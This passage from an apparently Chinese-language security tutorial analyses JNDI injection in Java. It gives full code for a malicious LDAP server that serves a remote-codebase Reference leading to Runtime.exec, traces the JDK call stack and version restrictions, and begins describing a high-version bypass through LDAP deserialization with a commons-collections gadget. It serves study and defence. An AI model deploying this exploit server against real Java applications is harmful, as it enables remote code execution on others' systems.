+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8888/#Exp&quot;</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(<span class="string">&quot;listen&quot;</span>, InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line">            ds.startListening();  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span><span class="params">(URL cb)</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e1) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (refPos &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line">            &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>攻击流程和之前一样</p>
+<h1 id="JNDI-注入原理分析"><a href="#JNDI-注入原理分析" class="headerlink" title="JNDI 注入原理分析"></a>JNDI 注入原理分析</h1><p>因为最后是弹计算器，用到了 <code>Runtime.getRuntime.exec</code> 所以直接在 <code>exec</code> 这里下断点，看看调用栈</p>
+<blockquote>
+<p>exec: 347, Runtime (java. lang)<br>&lt;init&gt;: 15, Exp<br>newInstance0:-1, NativeConstructorAccessorImpl (sun. reflect)<br>newInstance: 62, NativeConstructorAccessorImpl (sun. reflect)<br>newInstance: 45, DelegatingConstructorAccessorImpl (sun. reflect)<br>newInstance: 422, Constructor (java. lang. reflect)<br>newInstance: 442, Class (java. lang)<br>getObjectFactoryFromReference: 163, NamingManager (javax. naming. spi)<br>getObjectInstance: 319, NamingManager (javax. naming. spi)<br>decodeObject: 464, RegistryContext (com. sun. jndi. rmi. registry)<br>lookup: 124, RegistryContext (com. sun. jndi. rmi. registry)<br>lookup: 205, GenericURLContext (com. sun. jndi. toolkit. url)<br>lookup: 417, InitialContext (javax. naming)<br>main: 7, Client</p>
+</blockquote>
+<p>1. <code>InitialContext.lookup</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>getURLOrDefaultInitCtx</code> 函数实现如下</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Context <span class="title function_">getURLOrDefaultInitCtx</span><span class="params">(String name)</span>  </span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;  </span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">scheme</span> <span class="operator">=</span> getURLScheme(name);  </span><br><span class="line">    <span class="keyword">if</span> (scheme != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> NamingManager.getURLContext(scheme, myProps);  </span><br><span class="line">        <span class="keyword">if</span> (ctx != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> ctx;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>getURLOrDefaultInitCtx</code> 会通过 <code>getURLScheme</code> 解析 <code>name</code> 的协议头 <code>scheme</code>，并将 <code>scheme</code> 传入 <code>getURLContext</code> 来获取对应的 Context 对象，<strong>这也是 JNDI 动态协议转换的实现过程</strong></p>
+<p>此处返回 Context 对象的子类 rmiURLContext 对象后，调用了它的 <code>lookup</code> 方法</p>
+<p>2. <code>GenericURLContext.lookup</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="type">ResolveResult</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.getRootURLContext(var1, <span class="built_in">this</span>.myEnv);  </span><br><span class="line">    <span class="type">Context</span> <span class="variable">var3</span> <span class="operator">=</span> (Context)var2.getResolvedObj();  </span><br><span class="line">  </span><br><span class="line">    Object var4;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());  </span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">        var3.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> var4;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里的 <code>this</code> 就是之前返回的 rmiURLContext，也是 GenericURLContext 的子类，所以对它调用 <code>lookup</code> 就到了 <code>GenericURLContext.lookup</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/d07d03af54edd3bd1536adc21ff426bd_MD5.jpeg"
+                     
+                ></p>
+<p>不同的 <code>this</code> 在这里会执行不同的 <code>getRootURLContext</code>，并且根据不同的协议，在这里产生 RegistryContext 对象，并调用 lookup</p>
+<p>3. <code>RegistryContext. lookup </code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        Remote var2;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            var2 = <span class="built_in">this</span>.registry.lookup(var1.get(<span class="number">0</span>));  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(var1.get(<span class="number">0</span>));  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>与 RMI 服务端通信获取到一个 <code>ReferenceWrapper_Stub</code> 对象</p>
+<p>4. <code>RegistryContext.decodeObject</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;  </span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> var5;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;  </span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();  </span><br><span class="line">        var4.setRootCause(var7);  </span><br><span class="line">        <span class="keyword">throw</span> var4;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>对 <code>ReferenceWrapper_Stub</code> 对象拆包，得到 <code>var3</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/5e74fad48fe9b0c7ccf4b4730f0c5788_MD5.jpeg"
+                     
+                ></p>
+<p>此时 <code>var3</code> 已经是 Reference 实例了</p>
+<p>5. <code>NamingManager.getObjectInstance</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object  </span><br><span class="line">    <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,  </span></span><br><span class="line"><span class="params">                      Hashtable&lt;?,?&gt; environment)</span>  </span><br><span class="line">    <span class="keyword">throws</span> Exception  </span><br><span class="line">&#123;  </span><br><span class="line">  </span><br><span class="line">    ObjectFactory factory;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Use builder if installed  </span></span><br><span class="line">    <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();  </span><br><span class="line">    <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="comment">// builder must return non-null factory  </span></span><br><span class="line">        factory = builder.createObjectFactory(refInfo, environment);  </span><br><span class="line">        <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,  </span><br><span class="line">            environment);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Use reference if possible  </span></span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;  </span><br><span class="line">        ref = (Reference) refInfo;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;  </span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Object answer;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();  </span><br><span class="line">        <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively  </span></span><br><span class="line">  </span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);  </span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,  </span><br><span class="line">                                                 environment);  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="comment">// No factory found, so return original refInfo.  </span></span><br><span class="line">            <span class="comment">// Will reach this point if factory class is not in            // class path and reference does not contain a URL for it            return refInfo;  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses  </span></span><br><span class="line">            <span class="comment">// containing URLs  </span></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);  </span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span> answer;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// try using any specified factories  </span></span><br><span class="line">    answer =  </span><br><span class="line">        createObjectFromFactories(refInfo, name, nameCtx, environment);  </span><br><span class="line">    <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>传入 Reference 并解析类名，再使用 <code>getObjectFactoryFromReference</code> 方法找目标类，进行实例化后返回，此处继续跟进 <code>getObjectFactoryFromReference</code></p>
+<p>此外，<code>getObjectFactoryFromReference</code> 返回实例后，继续调用了实例的 <code>getObjectInstance</code> 方法，所以也可以通过重写 <code>getObjectInstance</code> 方法实现任意命令执行</p>
+<p>6. <code>NamingManager.getObjectFactoryFromReference</code></p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(  </span></span><br><span class="line"><span class="params">    Reference ref, String factoryName)</span>  </span><br><span class="line">    <span class="keyword">throws</span> IllegalAccessException,  </span><br><span class="line">    InstantiationException,  </span><br><span class="line">    MalformedURLException &#123;  </span><br><span class="line">    Class&lt;?&gt; clas = <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Try to use current class loader  </span></span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">         clas = helper.loadClass(factoryName);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">        <span class="comment">// ignore and continue  </span></span><br><span class="line">        <span class="comment">// e.printStackTrace();    &#125;  </span></span><br><span class="line">    <span class="comment">// All other exceptions are passed up.  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase    String codebase;  </span></span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;  </span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>先尝试从本地获取类，如果本地没有，就将 Reference 的 <code>factoryLocation</code> 作为 <code>codebase</code>，然后从 <code>codebase</code> 获取，最后将获取的类实例化并返回，<strong>这也是恶意类不继承 <code>ObjectFactory</code> 类就会报错的原因，没法转型</strong></p>
+<h1 id="JDK-版本限制"><a href="#JDK-版本限制" class="headerlink" title="JDK 版本限制"></a>JDK 版本限制</h1><p>一张图概括</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/22625492ee872b23da97c9bfb1ea4eca_MD5.jpeg"
+                     
+                ></p>
+<p>从 JDK 7u21、6u45 开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值为 <code>true</code>，即默认禁用自动加载远程类文件，RMI 的 codebase 攻击方法失效</p>
+<p>从 JDK  8u113、7u122、6u132 开始，<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值为 <code>false</code>，即默认不允许从远程的 Codebase 加载 Reference 工厂类，JNDI+RMI 的攻击方法失效</p>
+<p>从 JDK 11.0.1、8u191、7u201、6u211 开始，<code>com.sun.jndi.ldap.object.trustURLCodebase</code> 的默认值为 <code>false</code>，对 LDAP Reference 远程工厂类的加载增加了限制，JNDI+LDAP 的攻击方法失效</p>
+<h1 id="JNDI-高版本绕过"><a href="#JNDI-高版本绕过" class="headerlink" title="JNDI 高版本绕过"></a>JNDI 高版本绕过</h1><p>高版本对已经默认不允许加载 <code>codebase</code> 中的远程类，所以需要新的思路去攻击</p>
+<h2 id="LDAP-反序列化"><a href="#LDAP-反序列化" class="headerlink" title="LDAP+反序列化"></a>LDAP+反序列化</h2><p>LDAP 虽然无法加载远程类了，但是 LDAP 本身还支持序列化内容存储，如果 LDAP 返回的某个对象的 <code>javaSerializedData</code> 值不为空，Java 会对返回的内容进行反序列化，若本地有可用的 gadget，就可以实现攻击</p>
+<p>导入 LDAP 和 commons-collections 的依赖</p>
+<p>pom. xml</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>服务端</p>
